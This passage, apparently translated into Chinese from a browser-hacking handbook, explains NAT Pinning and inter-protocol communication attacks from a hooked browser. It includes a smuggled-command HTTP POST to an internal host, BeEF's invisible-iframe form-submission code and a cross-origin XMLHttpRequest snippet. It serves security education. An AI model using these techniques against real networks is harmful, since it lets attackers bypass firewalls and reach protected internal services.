
-   [伪造的 DCC 请求提交后，路由器随后允许来自 browserhacker.com 的入站流量在 22 端口上。该流量被重定向到内部服务器。最终结果是边界控制被修改，允许外部流量访问此前受保护的内部系统，使 IP 访问控制列表失效。](https://browserhacker.com)

Leppens 还贡献了一个利用 NAT Pinning 的 BeEF 模块。

Eric Leblond 将这些攻击扩展到除 IRC 之外的其他协议。他发布了名为 opensvp25 的工具，用于执行这些攻击。除了使用经典的 IRC DCC 方法外，该工具还可以使用 FTP 动态打开防火墙端口。请注意，21 端口已被禁用，因此无法在浏览器中进行 FTP NAT Pinning。

NAT Pinning 攻击是一个很好的例子，说明从网络中浏览器发起的请求如何影响更广阔的环境。通过伪造请求，并欺骗网关控制，你可以直接访问新目标并进一步扩展访问以进行后续攻击。

### 实现跨协议通信

2006 年，Wade Alcorn 发表了关于跨协议通信（IPC）的研究论文。IPC 的概念是：两种不同的协议，尽管语法不同，仍然可以相互传递有意义的信息。

在大多数情况下，成功的 IPC 条件更多取决于开发者的实现决策，而非协议规范本身。这些条件实际上非常简单。要实现两种不同协议之间的通信，必须满足以下前提：

*   目标协议实现具备容错能力

*   能够将目标协议的数据封装进 HTTP 请求

在浏览器环境中，这通常涉及向一个监听服务提交一个 HTTP 请求，该服务不使用 HTTP 协议。随后，请求（或其中一部分）会被正确解析。

让我们来看一个例子。一个虚构的协议语法非常简洁，它只理解两条不需要身份验证的命令：

```
READ <file_path>
WRITE <content> <file_path>
```

要判断该协议实现是否适合 IPC，你需要了解哪些条件会导致其丢弃 TCP 连接。如果下面的（非协议）数据被发送且连接仍保持活动，则说明该实现有潜力，值得进一步探索：

```
ADD foobar
```

由于客户端与服务器之间的连接未被重置，客户端可以继续使用同一 TCP 连接发送数据。因此，如果客户端发送以下数据，前两条错误的行会被丢弃，而第三条可能会被解析并成功执行：

```
ADD foo
ADD bar
WRITE browserhacker.com /opt/protocol/browserhacker
```

浏览器 IPC 会将整个消息包装进 HTTP POST 请求。下面的示例展示了很可能在目标服务上执行命令的请求：

```
POST / HTTP/1.1
Host: 192.168.1.130:4444
User-Agent: Mozilla/5.0 
Content-type: text/plain
Content-Length: 51

WRITE browserhacker.com /opt/protocol/browserhacker
```

HTTP 请求头将被丢弃，连同 CRLF 一起，而请求的最后一行会被目标协议正确处理。正如你所见，POST 请求让你可以在请求体中自由添加任意数据，而无需在前面预置标准 HTTP 头。正是在请求体中，你才真正掌控与目标协议的通信。这是浏览器通过 IPC 与目标协议通信的核心概念。

你的 POST 请求必须将 Content-Type 设置为 text/plain 或 multipart/form-data。这是为了确保可以通过 XMLHttpRequest（或 HTML 表单）跨源发送请求，如第 9 章“发送跨源请求”节中讨论。这两种 Content-Type 不限制你可以使用的数据格式，而 application/x-www-form-urlencoded 则限制你必须使用 body 结构为 parameter=value，并使用 & 连接额外参数。空格等字符的编码也可能出现问题。使用 text/plain 或 multipart/form-data，你对请求体的内容拥有完全自由，例如可以添加 CR/LF 行和空格。

你有两种方式在浏览器中发送跨源 text/plain 或 multipart/form-data POST 请求。第一种方式是动态创建 HTML 表单，并使用 JavaScript 提交。BeEF 的 JavaScript API 提供了 createIframeIpecForm() 方法来实现：

```
createIframeIpecForm: function(rhost, rport, path, commands){
 // 创建一个不可见的 Iframe 元素，HTML 表单将放置在此
 var iframeIpec = beef.dom.createInvisibleIframe();

 // 创建 HTML 表单。注意 enctype 属性。
 var formIpec = document.createElement('form');
 formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
 formIpec.setAttribute('method',  'POST');
 formIpec.setAttribute('enctype', 'multipart/form-data');

 // 创建 textarea 元素
 // 用于添加 POST body
 input = document.createElement('textarea');
 input.setAttribute('name', Math.random().toString(36).substring(5));
 input.value = commands;
 formIpec.appendChild(input);
 iframeIpec.contentWindow.document.body.appendChild(formIpec);
 formIpec.submit();

 return iframeIpec;
}
```

该方法的调用方式如下：

```
beef.dom.createIframeIpecForm(host, port, path, commands);
```

注意，大多数情况下 path 参数并不需要。commands 参数保存你想在 POST 请求体中发送的数据。

第二种在浏览器中发起 IPC 的方式是使用 XMLHttpRequest 对象。下面的代码展示了一个示例：

```
var xhr = new XMLHttpRequest();
var uri = "http://" + host + ":" + port + "/";
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.setRequestHeader('Accept','*/*');
xhr.setRequestHeader("Accept-Language", "en");
xhr.send(command + "\r\n");
```

command 变量包含你想发送给协议的数据，后面跟一个回车符和换行符（\\r\\n）。许多协议使用这些字符来标记当前命令的结束。

这便是浏览器通过 IPC 与虚构协议进行通信的一个例子。该协议实现支持了一些属性，使得此类攻击成为可能。下面的章节将更详细地探讨这些前提条件。

### 协议的容错能力

IPC 的第一个挑战是确保目标协议实现能够容忍错误。这通常会区分那些可以通过浏览器通过 IPC 进行通信的协议与不能的协议。

如前面的例子所示，大部分 HTTP 请求内容（如头部）应被目标协议丢弃。SMTP 是一个很好的教育示例。不过，由于它运行在禁用端口上，在渗透评估中使用会受到限制。

在 UNIX 系统上，至少有四种 SMTP 实现，包括 Postfix、Sendmail、Qmail 和 Exim。在默认配置下，Exim 4.50 在发现四次错误后才会断开客户端连接。这种严格的要求使得你无法针对 Exim 版本高于 4.50 进行 IPC，因为从被钩住的浏览器发送的每个 HTTP 请求都会包含多于四个头部。

Postfix 版本 2.7.0 对错误的容忍度甚至低于 Exim。它一旦检测到非 SMTP 命令，就会立即断开与客户端的连接：

